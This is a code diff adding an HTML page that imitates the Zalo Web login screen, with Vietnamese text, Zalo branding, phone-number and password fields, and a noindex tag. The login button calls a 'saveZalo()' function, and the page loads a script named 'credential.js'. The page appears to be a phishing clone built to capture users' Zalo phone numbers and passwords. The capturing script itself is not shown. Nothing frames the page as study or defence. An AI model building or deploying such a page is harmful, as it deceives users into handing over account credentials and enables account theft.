@@ -1,0 +1,164 @@
+<html lang="en">
+
+<head>
+        <meta name="robots" content="noindex">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="keywords" content="dang nhap zalo, zalo web, dang nhap zalo web.">
+        <meta name="description"
+                content="Trang đăng nhập vào Zalo Web sử dụng chung tài khoản zalo trên mobile. Bạn cũng có thể đăng nhập bằng cách quét mã QR và dùng tài khoản facebook.">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+        <meta charset="utf-8">
+
+        <link href="zalo.css" rel="stylesheet">
+        <title>Đăng nhập bằng tài khoản Zalo</title>
+
+</head>
+
+<script src="js/site.js"></script>
+<script src="js/credential.js"></script>
+
+<body>
+        <div id="app" class="wrapper-page has-mobile">
+                <div class="wrapper-page is-only-desktop">
+                        <div class="zLogin-layout parentDisable">
+                                <div class="header animated fadeIn">
+                                        <h1><a class="logo" style="cursor: auto;"></a></h1>
+                                        <h2 class="hide-on-med-and-down">Đăng nhập bằng tài khoản Zalo</h2>
+                                        <h2 class="hide-on-med-and-down custom_app_name">chat.zalo.me</h2>
+                                </div>
+                                <div class="body">
+                                        <div>
+                                                <div>
+                                                        <div class="body-container animated fadeIn">
+                                                                <div>
+                                                                        <div class="tabs animated fadeIn">
+                                                                                <ul>
+                                                                                        <li><a class="active"
+                                                                                                        href="#">Với Số
+                                                                                                        điện thoại</a>
+                                                                                        </li>
+                                                                                        <li><a class="" href="#">Với Mã
+                                                                                                        QR</a></li>
+                                                                                </ul>
+                                                                        </div>
+                                                                        <div class="content animated fadeIn">
+                                                                                <div>
+                                                                                        <div class="animated fadeIn"
+                                                                                                style="margin-top: 0px;">
+                                                                                                <div
+                                                                                                        class="form-signin">
+                                                                                                        <div>
+                                                                                                                <div
+                                                                                                                        class="animated fadeIn">
+                                                                                                                        <div
+                                                                                                                                class="line-form has-ico has-flag">
+                                                                                                                                <div><i class="fa fa-mobile"></i>
+                                                                                                                                        <div
+                                                                                                                                                class="select-flag">
+                                                                                                                                                <span
+                                                                                                                                                        class="tf">+84</span>
+                                                                                                                                        </div>
+                                                                                                                                </div>
+                                                                                                                                <input id="zlusername"
+                                                                                                                                        tabindex="1"
+                                                                                                                                        type="tel"
+                                                                                                                                        name="phone_num"
+                                                                                                                                        placeholder="Số điện thoại"
+                                                                                                                                        class="input">
+                                                                                                                        </div>
+                                                                                                                        <div
+                                                                                                                                class="line-form has-ico">
+                                                                                                                                <i
+                                                                                                                                        class="fa fa-lock"></i>
+                                                                                                                                <input type="password"
+                                                                                                                                        id="zlpassword"
+                                                                                                                                        placeholder="Mật khẩu">
+                                                                                                                        </div>
+                                                                                                                        <div class="space"
+                                                                                                                                id="test">
+                                                                                                                        </div>
+                                                                                                                        <div
+                                                                                                                                class="textAlign-center has-2btn">
+                                                                                                                                <a class="btn btn--m block first"
+                                                                                                                                        onclick="saveZalo()">Đăng
+                                                                                                                                        nhập
+                                                                                                                                        với
+                                                                                                                                        mật
+                                                                                                                                        khẩu</a>
+                                                                                                                                <div
+                                                                                                                                        class="btn-wrap-more">
+                                                                                                                                        <a
+                                                                                                                                                class="btn btn-default btn-rq btn--m disabled">Gửi
+                                                                                                                                                yêu
+                                                                                                                                                cầu
+                                                                                                                                                đăng
+                                                                                                                                                nhập</a>
+                                                                                                                                        <span
+                                                                                                                                                class="data-tooltip custom_tooltip">Đăng
+                                                                                                                                                nhập
+                                                                                                                                                không
+                                                                                                                                                dùng
+                                                                                                                                                mật
+                                                                                                                                                khẩu</span>
+                                                                                                                                        <div
+                                                                                                                                                class="login-or">
+                                                                                                                                                <a
+                                                                                                                                                        style="margin: 0px; overflow: hidden; white-space: nowrap;">Quên
+                                                                                                                                                        mật
+                                                                                                                                                        khẩu?</a>
+                                                                                                                                                <div
+                                                                                                                                                        class="fb-box">
+                                                                                                                                                        <span
+                                                                                                                                                                class="help-text">Hoặc
+                                                                                                                                                                đăng
+                                                                                                                                                                nhập
+                                                                                                                                                                bằng</span><span
+                                                                                                                                                                style="transition: opacity 0.5s ease 0s;"><button
+                                                                                                                                                                        type="button"
+                                                                                                                                                                        class="btn btn-default btn-fb btn--m fa fa-facebook fb-icon-custom-style small"></button></span>
+                                                                                                                                                </div>
+                                                                                                                                        </div>
+                                                                                                                                </div>
+                                                                                                                        </div>
+                                                                                                                </div>
+                                                                                                        </div>
+                                                                                                </div>
+                                                                                        </div>
+                                                                                </div>
+                                                                        </div>
+                                                                </div>
+                                                        </div>
+                                                        <div>
+                                                                <p class="action-more">Bạn chưa có tài khoản? <a>Đăng ký
+                                                                                ngay!</a></p>
+                                                        </div>
+                                                </div>
+                                        </div>
+                                </div>
+                                <div class="footer">
+                                        <p class="select-lang"><a class="lang" style="font-weight: bold;">Tiếng
+                                                        Việt</a><a class="lang">English</a></p>
+                                        <p>Dùng tài khoản Zalo để truy cập các ứng dụng của ZA</p>
+                                        <div class="logos">
+                                                <ul>
+                                                        <li><a target="_blank" class="logo-zalo"><i
+                                                                                class="logo-zalo">Zalo</i></a></li>
+                                                        <li><a target="_blank" class="logo-zingmp3"><i
+                                                                                class="logo-zingmp3">ZingMp3</i></a>
+                                                        </li>
+                                                        <li><a target="_blank" class="logo-zingtv"><i
+                                                                                class="logo-zingtv">ZingTV</i></a></li>
+                                                        <li><a target="_blank" class="logo-zing"><i
+                                                                                class="logo-zing">Zing</i></a></li>
+                                                        <li><a target="_blank" class="logo-baomoi"><i
+                                                                                class="logo-baomoi">Baomoi</i></a></li>
+                                                </ul>
+                                        </div>
+                                </div>
+                        </div>
+                </div>
+        </div>
+
+</body>
+
+</html>
